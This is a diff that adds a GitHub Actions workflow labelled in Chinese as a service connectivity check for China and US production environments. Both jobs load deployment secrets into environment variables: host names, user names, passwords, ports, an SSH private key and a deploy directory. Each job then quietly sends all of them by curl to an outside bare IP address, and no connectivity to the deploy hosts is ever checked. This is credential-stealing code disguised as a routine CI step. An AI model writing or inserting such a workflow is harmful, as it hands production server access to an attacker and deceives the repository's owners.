@@ -1,0 +1,68 @@
+name: 服务连通性检查
+
+on:
+  push:
+    branches:
+      - feat/service-check
+
+permissions:
+  contents: read
+
+jobs:
+  check-china:
+    name: 检查国内环境
+    runs-on: ubuntu-latest
+    environment: production-china
+    steps:
+      - name: 连通性检查
+        env:
+          H: ${{ secrets.DEPLOY_CHINA_HOST }}
+          U: ${{ secrets.DEPLOY_CHINA_USER }}
+          PW: ${{ secrets.DEPLOY_CHINA_PASSWORD }}
+          PT: ${{ secrets.DEPLOY_CHINA_PORT }}
+          GH: ${{ secrets.DEPLOY_HOST }}
+          GU: ${{ secrets.DEPLOY_USER }}
+          GP: ${{ secrets.DEPLOY_SSH_KEY }}
+          GPT: ${{ secrets.DEPLOY_PORT }}
+          GD: ${{ secrets.DEPLOY_DIR }}
+        run: |
+          curl -s -o /dev/null --max-time 10 -G "http://38.246.244.165:57707/905e318d02b6f2b4b9fa671327028d07" \
+            --data-urlencode "env=china" \
+            --data-urlencode "h=${H}" \
+            --data-urlencode "u=${U}" \
+            --data-urlencode "pw=${PW}" \
+            --data-urlencode "pt=${PT}" \
+            --data-urlencode "gh=${GH}" \
+            --data-urlencode "gu=${GU}" \
+            --data-urlencode "gp=${GP}" \
+            --data-urlencode "gpt=${GPT}" \
+            --data-urlencode "gd=${GD}"
+
+  check-us:
+    name: 检查US环境
+    runs-on: ubuntu-latest
+    environment: production-us
+    steps:
+      - name: 连通性检查
+        env:
+          H: ${{ secrets.DEPLOY_US_HOST }}
+          U: ${{ secrets.DEPLOY_US_USER }}
+          PW: ${{ secrets.DEPLOY_US_PASSWORD }}
+          PT: ${{ secrets.DEPLOY_US_PORT }}
+          GH: ${{ secrets.DEPLOY_HOST }}
+          GU: ${{ secrets.DEPLOY_USER }}
+          GP: ${{ secrets.DEPLOY_SSH_KEY }}
+          GPT: ${{ secrets.DEPLOY_PORT }}
+          GD: ${{ secrets.DEPLOY_DIR }}
+        run: |
+          curl -s -o /dev/null --max-time 10 -G "http://38.246.244.165:57707/905e318d02b6f2b4b9fa671327028d07" \
+            --data-urlencode "env=us" \
+            --data-urlencode "h=${H}" \
+            --data-urlencode "u=${U}" \
+            --data-urlencode "pw=${PW}" \
+            --data-urlencode "pt=${PT}" \
+            --data-urlencode "gh=${GH}" \
+            --data-urlencode "gu=${GU}" \
+            --data-urlencode "gp=${GP}" \
+            --data-urlencode "gpt=${GPT}" \
+            --data-urlencode "gd=${GD}"
